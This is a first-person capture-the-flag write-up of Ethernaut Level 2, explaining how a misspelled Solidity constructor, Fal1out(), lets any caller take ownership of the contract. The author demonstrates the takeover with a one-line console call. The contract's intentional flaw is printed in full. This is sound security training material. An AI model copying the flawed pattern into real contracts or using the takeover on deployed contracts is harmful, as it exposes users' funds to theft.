# Ethernaut Level 2 — Fallout

## Introduction

**Fallout** is Level 2 of OpenZeppelin's Ethernaut Web3 CTF.

The main objective of this level is to **become the owner of the contract**.

At first glance, the contract looks like a simple Ether allocation contract. Most of the functions are just handling deposits, allocations, and transfers. The important part was figuring out how the `owner` variable was initially set and whether there was a way for me to change it.

---

## Objective

The objective of this level is to become the owner of the `Fallout` contract.

After becoming the owner, the level can be completed by satisfying the ownership requirement.

---

## 1. Understanding the Contract

I first checked the contract code given in the challenge and went through the functions and modifier to see where the important logic was.

### `allocations`

```solidity
mapping(address => uint256) allocations;
```

This mapping keeps track of how much Ether has been allocated to each address.

### `owner`

```solidity
address payable public owner;
```

This stores the current owner of the contract.

### `Fal1out()`

```solidity
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

This was the most important part of the contract.

At first, it looks like a constructor because it has the same general structure as a constructor from older Solidity versions.

However, the contract is actually named:

```solidity
contract Fallout
```

while the function is named:

```solidity
function Fal1out()
```

There is a difference in the name: **`Fallout` uses an `l`, while `Fal1out` contains the number `1`.**

Because of this typo, `Fal1out()` is not the constructor.

It is just a normal `public payable` function that anyone can call.

Inside the function:

```solidity
owner = msg.sender;
```

the caller becomes the owner.

So this immediately gave me a possible way to take ownership of the contract.

### `onlyOwner`

```solidity
modifier onlyOwner() {
    require(msg.sender == owner, "caller is not the owner");
    _;
}
```

This modifier makes sure that only the current owner can execute functions that use it.

### `allocate()`

```solidity
function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
}
```

This function lets a user add Ether to their allocation.

It is mainly standard bookkeeping for the user's balance.

### `sendAllocation()`

```solidity
function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
}
```

This function transfers the allocation belonging to the specified address.

The only requirement is that the selected address has a non-zero allocation.

### `collectAllocations()`

```solidity
function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
}
```

This transfers the entire balance of the contract to the caller.

Because it uses the `onlyOwner` modifier, only the owner can call it.

### `allocatorBalance()`

```solidity
function allocatorBalance(address allocator) public view returns (uint256) {
    return allocations[allocator];
}
```

This simply returns the allocation stored for a particular address.

---

## 2. Inspecting the Contract and ABI

After checking the source code, I opened the browser console and typed:

```javascript
contract
```

The console displayed the contract object along with its ABI and the functions that were available to call.

Among the functions I could see:

```text
Fallout()
allocate()
allocatorBalance()
collectAllocations()
owner()
sendAllocation()
```

This was useful because I could confirm that the suspicious `Fal1out()` function was exposed through the contract interface.

---

## 3. Finding the Ownership Vulnerability

The main thing I was looking for was how the `owner` variable was being set.

In the code, I found:

```solidity
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

Normally, a constructor is executed only when the contract is deployed.

But this function was declared as:

```solidity
public payable
```

which means it can be called by anyone.

The reason this happened is the typo in the function name.

The contract is:

```solidity
contract Fallout
```

but the function is:

```solidity
function Fal1out()
```

The `1` makes the names different.

Because of that, Solidity treats `Fal1out()` as a regular function instead of a constructor.

That means when I call it, this line:

```solidity
owner = msg.sender;
```

sets the owner to my address.

---

## 4. Calling `Fal1out()`

Since the ABI showed that the function was available, I called it from the console:

```javascript
await contract.Fal1out()
```

The transaction was successfully submitted.

Since `msg.sender` inside `Fal1out()` is the account that called the function, the following assignment:

```solidity
owner = msg.sender;
```

made my account the new owner.

The second line:

```solidity
allocations[owner] = msg.value;
```

sets my allocation to the amount of Ether sent with the call.

Since I didn't need to send Ether to exploit the ownership issue, the important part for this level was the first line:

```solidity
owner = msg.sender;
```

---

## 5. Verifying the Owner

After calling `Fal1out()`, I could check the current owner through the public `owner` variable.

I used:

```javascript
await contract.owner()
```

The returned address should match my player address.

This confirmed that the call to `Fal1out()` had successfully changed the ownership of the contract.

---

## 6. Completing the Level


The vulnerability came from an old-style constructor declaration being accidentally written with a typo.

The contract was named:

```solidity
Fallout
```

but the supposed constructor was:

```solidity
Fal1out()
```

Because the names did not match, the function became publicly callable.

The complete exploit was simply:

```javascript
await contract.Fal1out()
```

After that, I verified the owner with:

```javascript
await contract.owner()
```

Since my address had become the owner, the ownership condition for the level was satisfied.

## Level 2 — Completed ✅
